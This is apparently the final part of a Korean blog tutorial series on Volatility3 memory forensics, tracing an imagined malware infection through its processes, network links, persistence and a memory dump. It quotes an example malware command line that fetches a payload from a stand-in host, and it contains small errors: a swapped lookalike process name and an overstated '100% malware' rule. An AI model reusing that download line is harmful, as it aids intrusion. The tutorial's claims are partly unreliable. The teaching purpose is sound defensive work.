---
layout: post
title:  "실전! 악성코드 감염 메모리 분석 (5/5)"
date:   2025-07-12 10:00:00 +0900
categories: forensics volatility
---

## 들어가며

대망의 마지막 5부입니다. 지난 4부까지 우리는 Volatility3의 주요 플러그인 사용법을 익혔습니다. 이제는 실전입니다. 이번 포스트에서는 가상의 악성코드 감염 시나리오를 통해, 지금까지 배운 모든 지식과 기술을 종합하여 실제 침해사고 분석처럼 메모리 덤프를 분석하는 전 과정을 함께 밟아보겠습니다.

## 시나리오

**상황:** 사용자로부터 "PC가 평소보다 매우 느려지고, 이상한 광고창이 계속 뜬다"는 신고가 접수되었습니다. 의심스러운 정황에 따라 즉시 해당 PC의 메모리를 덤프하여 `suspicious.mem` 파일을 확보했습니다.

**임무:** 메모리 덤프 분석을 통해 악성코드의 존재 여부를 확인하고, 감염 경로와 행위를 파악하라.

## 분석 절차 (Step-by-Step)

### Step 1: 기본 정보 확인

가장 먼저, 덤프 파일의 기본적인 시스템 정보를 확인하여 분석의 기준점을 잡습니다.

```bash
vol.py -f suspicious.mem windows.info.Info
```

- **확인 사항:** 운영체제 버전, 덤프 시간 등.
- **예상 결과:** Windows 10 x64, 덤프 시간은 신고 접수 시간과 유사. Volatility3가 적절한 심볼을 자동으로 찾아 적용했는지 확인합니다.

### Step 2: 의심스러운 프로세스 탐색

이제 어떤 프로세스들이 실행 중인지 확인하여 악성 행위의 주체를 찾아야 합니다. `pslist`, `pstree`, `psscan`을 종합적으로 사용합니다.

```bash
vol.py -f suspicious.mem windows.pslist.PsList
vol.py -f suspicious.mem windows.pstree.PsTree
vol.py -f suspicious.mem windows.psscan.PsScan
```

- **분석 포인트:**
    1.  **이상한 이름의 프로세스:** `cftmon.exe`를 위장한 `ctfmon.exe`나 `svch0st.exe` 같은 오타, 또는 `1a2b3c.exe` 처럼 의미 없는 이름의 프로세스를 찾습니다.
    2.  **비정상적인 부모-자식 관계:** `pstree`를 통해 `explorer.exe`나 `services.exe`가 아닌, `winword.exe`나 `powershell.exe` 같은 프로세스가 알 수 없는 자식 프로세스를 실행시킨 경우를 찾습니다.
    3.  **숨겨진 프로세스:** `pslist`에는 없지만 `psscan`에는 존재하는 프로세스를 찾습니다. 이것이 있다면 100% 악성코드입니다.

- **가상 발견:** `pstree` 분석 결과, `powershell.exe` (PID 3124)가 `evil.exe` (PID 4567)라는 의심스러운 이름의 프로세스를 실행시킨 것을 발견했다고 가정합시다.

### Step 3: 프로세스 상세 분석

`evil.exe` (PID 4567)를 집중적으로 파헤쳐 봅니다.

```bash
# evil.exe의 실행 인자 확인
vol.py -f suspicious.mem windows.cmdline.CmdLine --pid 4567

# evil.exe가 로드한 DLL 목록 확인
vol.py -f suspicious.mem windows.dlllist.DllList --pid 4567
```

- **분석 포인트:**
    - `cmdline` 결과, `evil.exe -c http://malware.com/payload.dat` 와 같이 특정 서버 주소가 인자로 사용되었는지 확인합니다.
    - `dlllist` 결과, `ws2_32.dll`, `wininet.dll` 등 네트워크 관련 DLL이 로드되었다면 외부 통신을 시도했을 가능성이 높습니다.

### Step 4: 네트워크 연결 확인

`evil.exe`가 실제로 외부와 통신했는지 `netscan`으로 확인합니다.

```bash
vol.py -f suspicious.mem windows.netscan.NetScan
```

- **분석 포인트:**
    - `netscan` 결과에서 `Owner`가 `evil.exe`이거나 `PID`가 4567인 연결을 찾습니다.
    - **가상 발견:** `evil.exe`가 `123.123.123.123:8080` 이라는 의심스러운 IP 주소와 `ESTABLISHED` 상태로 연결된 것을 발견했습니다. 이 IP는 알려진 악성 C&C 서버일 수 있습니다.

### Step 5: 지속성(Persistence) 확인

악성코드가 시스템 재부팅 후에도 살아남기 위해 사용한 방법을 추적합니다. 주로 레지스트리 `Run` 키를 확인합니다.

```bash
# 1. 레지스트리 하이브 목록과 주소 확인
vol.py -f suspicious.mem windows.registry.hivelist.HiveList

# 2. SOFTWARE 하이브의 주소를 확인(예: 0xfffff12345678900)하고 Run 키 값 출력
vol.py -f suspicious.mem --offset 0xfffff12345678900 windows.registry.printkey.PrintKey --key "Microsoft\Windows\CurrentVersion\Run"
```

- **분석 포인트:**
    - `Run` 키에 `C:\Users\victim\AppData\Local\Temp\evil.exe` 와 같이 의심스러운 경로의 파일이 등록되어 있는지 확인합니다.

### Step 6: 악성 파일 추출 (덤프)

분석의 마지막 단계로, 의심스러운 프로세스(`evil.exe`)를 메모리에서 직접 추출하여 정적 분석(예: VirusTotal, IDA Pro)에 활용할 수 있습니다.

```bash
# 먼저 evil.exe의 메모리 맵을 확인
vol.py -f suspicious.mem windows.memmap.Memmap --pid 4567

# 프로세스를 덤프
vol.py -f suspicious.mem windows.dumpfiles.DumpFiles --pid 4567
```

- **결과:** 현재 디렉터리에 `pid.4567.dmp` 와 같은 파일이 생성됩니다. 이 파일의 해시 값을 계산하여 VirusTotal에 조회하거나, 악성코드 분석가에게 전달하여 심층 분석을 의뢰할 수 있습니다.

## 결론 및 시리즈를 마치며

위와 같은 절차를 통해 우리는 메모리 덤프만으로 `evil.exe`라는 악성 프로세스를 식별하고, C&C 서버 통신 사실과 레지스트리를 통한 지속성 유지 방법까지 파악할 수 있었습니다.

지난 5주간의 시리즈를 통해 메모리 포렌식의 기본 개념부터 Volatility3를 활용한 실전 분석까지 함께 달려왔습니다. 메모리 포렌식은 보이지 않는 위협을 찾아내는 매력적이고 강력한 기술입니다. 이 시리즈가 여러분의 기술적 성장에 작은 디딤돌이 되었기를 바랍니다. 꾸준한 연습과 학습을 통해 최고의 디지털 포렌식 전문가로 거듭나시길 응원합니다. 감사합니다!
